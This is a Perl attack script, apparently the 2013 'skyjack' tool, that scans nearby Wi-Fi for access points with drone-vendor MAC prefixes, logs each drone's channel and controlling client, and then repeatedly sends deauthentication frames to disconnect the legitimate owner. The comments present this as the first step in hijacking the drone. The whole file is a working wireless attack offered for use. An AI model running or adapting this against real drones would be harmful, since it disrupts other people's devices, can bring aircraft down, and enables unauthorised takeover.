#!/usr/bin/perl

# skyjack, by samy kamkar

# this software detects flying drones, deauthenticates the
# owner of the targetted drone, then takes control of the drone

# by samy kamkar, code@samy.pl
# http://samy.pl
# dec 2, 2013


# mac addresses of ANY type of drone we want to attack
# Parrot owns the 90:03:B7 block of MACs and a few others
# see here: http://standards.ieee.org/develop/regauth/oui/oui.txt
my @drone_macs = qw/90:03:B7 A0:14:3D 00:12:1C 00:26:7E/;


use strict;

my $interface  = shift || "wlan0";

# paths to applications
my $iwconfig	= "iwconfig";
my $ifconfig	= "ifconfig";
my $airmon	= "airmon-ng";
my $aireplay	= "aireplay-ng";
my $aircrack	= "aircrack-ng";
my $airodump	= "airodump-ng";


# put device into monitor mode
sudo($ifconfig, $interface, "down");
#sudo($airmon, "start", $interface);

# tmpfile for ap output
my $tmpfile = "/tmp/dronestrike";
my %skyjacked;

my %clients;
my %chans;

while (!%clients)
{

		# show user APs
		eval {
			local $SIG{INT} = sub { die };
			my $pid = open(DUMP, "|sudo $airodump --output-format csv -w $tmpfile $interface >>/dev/null 2>>/dev/null") || die "Can't run airodump ($airodump): $!";
			print "pid $pid\n";

			# wait 10 seconds then kill
			sleep 10;
			print DUMP "\cC";
			sleep 1;
			sudo("kill", $pid);
			sleep 1;
			sudo("kill", "-HUP", $pid);
			sleep 1;
			sudo("kill", "-9", $pid);
			sleep 1;
			sudo("killall", "-9", $aireplay, $airodump);
			#kill(9, $pid);
			close(DUMP);
		};

		sleep 4;
		# read in APs
		foreach my $tmpfile1 (glob("$tmpfile*.csv"))
		{
				open(APS, "<$tmpfile1") || print "Can't read tmp file $tmpfile1: $!";
				while (<APS>)
				{
					# strip weird chars
					s/[\0\r]//g;

					foreach my $dev (@drone_macs)
					{
						# determine the channel
						if (/^($dev:[\w:]+),\s+\S+\s+\S+\s+\S+\s+\S+\s+(\d+),.*(ardrone\S+),/)
						{
							print "CHANNEL $1 $2 $3\n";
							$chans{$1} = [$2, $3];
						}

						# grab our drone MAC and owner MAC
						if (/^([\w:]+).*\s($dev:[\w:]+),/)
						{
							print "CLIENT $1 $2\n";
							$clients{$1} = $2;
						}
					}
				}
				close(APS);
				sudo("rm", $tmpfile1);
				#unlink($tmpfile1);
		}
		print "\n\n";
}

foreach my $cli (keys %clients)
{
    print "Found client ($cli) connected to $chans{$clients{$cli}}[1] ($clients{$cli}, channel $chans{$clients{$cli}}[0])\n";
}

# Give us some time so we can ready the hijacking computer
print "Press Enter to continue...\n";
<STDIN>

while (1) {

		foreach my $cli (keys %clients)
		{
			print "Found client ($cli) connected to $chans{$clients{$cli}}[1] ($clients{$cli}, channel $chans{$clients{$cli}}[0])\n";


			# hop onto the channel of the ap
			print "Jumping onto drone's channel $chans{$clients{$cli}}[0]\n\n";
			#sudo($airmon, "start", $interface, $chans{$clients{$cli}}[0]);
			sudo($iwconfig, $interface, "channel", $chans{$clients{$cli}}[0]);

			sleep(1);

			# now, disconnect the TRUE owner of the drone.
			# sucker.
			print "Disconnecting the true owner of the drone ;)\n\n";
			sudo($aireplay, "-0", "32", "-a", $clients{$cli}, "-c", $cli, $interface);

		}

		# go into managed mode
		#sudo($airmon, "stop", $interface);


	sleep 2;
}

	
sub sudo
{
	print "Running: @_\n";
	system("sudo", @_);
}
